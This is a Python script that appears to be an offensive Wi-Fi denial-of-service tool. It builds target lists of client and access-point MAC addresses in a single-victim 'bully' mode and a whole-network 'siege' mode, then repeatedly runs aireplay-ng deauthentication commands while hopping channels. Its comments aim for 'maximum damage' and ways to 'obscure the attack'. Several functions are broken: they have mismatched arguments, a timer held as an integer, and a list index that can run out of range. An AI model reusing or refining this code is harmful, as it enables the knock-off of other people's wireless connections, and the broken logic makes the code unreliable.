import os
from datetime import datetime
import time
import subprocess

def get_bully_attack_list(d, victim):
    l = []
    for channel in d[victim]["channels"]:
        for bssid in d[victim]["channels"][channel]:
            l.append({"channel": channel, "client_mac": victim, "ap_mac":bssid})
    return l

def get_siege_attack_list(d, essid, clients):
    # list of dictionaries to make it easy to change channels
    l = []
    for channel in d[essid]:
        for  ap_mac in d[essid][channel]:
            for client_mac in d[essid][channel][ap_mac]:
                if len(clients) == 0 or client_mac in clients:
                    l.append({"channel": channel, "client_mac": client_mac, "ap_mac":ap_mac})

    return l


def hop_to_channel(c):
    return subprocess.Popen(["airodump-ng", "wlan0mon","-c",str(c)],
                            stdout=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE)


def begin_attack(
                 dict1,
                 dict2,
                 mode="bully",
                 victims_mac = None,
                 net_clients = None,
                 ESSID = None,
                 attack_time = 180,
                 wireless_adapter = "wlan0mon"
                ):

    """
    :param dict1: essid dict data
    :param dict2: inverted index
    :param mode:  defaults to bully mode, otherwise indicate "siege"

    :param victims_mac: must be a string with the mac address to be bullied
                        and passed by name if bully mode

    :param ESSID: must be a string with the identifier of a network
    :param net_clients: optional list of clients in ESSID network clients
                        passing an empty list indicates attack all

    :param attack_time: attack length duration in seconds, defaults to 180
    :return:            1/0
    """
    attack_list = []
    channels = []

    if mode == "bully":
        assert net_clients  is None
        assert ESSID is None
        assert not dict2 is None
        attack_list = get_bully_attack_list(dict2)

    else:
        assert victims_mac is None
        assert not dict1 is None
        attack_list = get_siege_attack_list(dict1, ESSID, net_clients)

    CURR_TIME = datetime.now()
    TIME_DIFF = 0

    i = 0

    while TIME_DIFF.total_seconds() < attack_time:
        channel = attack_list[i]["channel"]
        # set the channel
        airodump = hop_to_channel(channel)
        # TODO Tinker with list_cycles to achieve maximum damage
        attack_clients(attack_list[i], 1, wireless_adapter, list_cycles=2, time_between_cycles=0 )
        airodump.kill()
        TIME_DIFF = datetime.now() - CURR_TIME
        i = i + 1 if i < len (attack_list) else 0
    return 0





def de_auth_client( client_mac,
                    access_point_mac,
                    deauths=1,
                    adapter="wlan0mon"):

    """
    :param client_mac:
    :param access_point_mac:
    :param deauths: number of de-authentications (128 packets to router and client per deauth)
    :param adapter:
    :return:
    """
    r = os.system("aireplay-ng " + "-0 " + str(deauths) + " -a " + str(access_point_mac) \
              + " -c " + client_mac + " " + adapter)

    """
    # slow but better feedback
    import subprocess
    r2 = subprocess.call(["aireplay-ng", "-0", str(num_packets), "-a", str(access_point_mac),\
                          "-c", client_mac, adapter], stdout=subprocess.PIPE)

    stdout, stderr = r2.communicate()
    """
    return r

def attack_clients(clients_dict,
                   de_auths_per_client,
                   adapter,
                   timeout=60,
                   list_cycles=100,
                   time_between_cycles=1
                   ):
    """
    :param clients_dict: a dictionary of clients with (at least) client_mac, ap_mac. keys
    :param de_auths_per_client: (int) doesn't necessarily have to be large if
           cycling a list of clients is fast enough. Also note that 1 deauth = 128 packets
           Passing this option as zero makes it unlimited deauths
    :param adapter: If not wlan0mon pass name here
    :param timeout: how long is the attack
    :param list_cycles: how many iterations over the list of victims
    :param time_between_cycles: (int/float  in seconds) can help obscure the attack
    :return:  nothing

        IMPORTANT. List of clients exist on a per-channel basis. So this function needs to be
        called for every channel where there are targets.
    """
    CURR_TIME = datetime.now()
    TIME_DIFF = datetime.now() - CURR_TIME

    count = 0
    for i in range (list_cycles):

        TIME_DIFF = datetime.now() - CURR_TIME
        if timeout < TIME_DIFF.total_seconds() :
            print ("terminating timed attack")
            break
        else:
            for mac_pair in clients_dict:
                count += 1
                de_auth_client(mac_pair["client_mac"],
                               mac_pair["ap_mac"],
                               deauths=de_auths_per_client,
                               adapter=adapter)
                if time_between_cycles > 0:
                    print ("sleeping for: " + str(time_between_cycles))
                    time.sleep(time_between_cycles)

    print ("terminating list cycle attack")

if __name__ == "__main__":
    pass
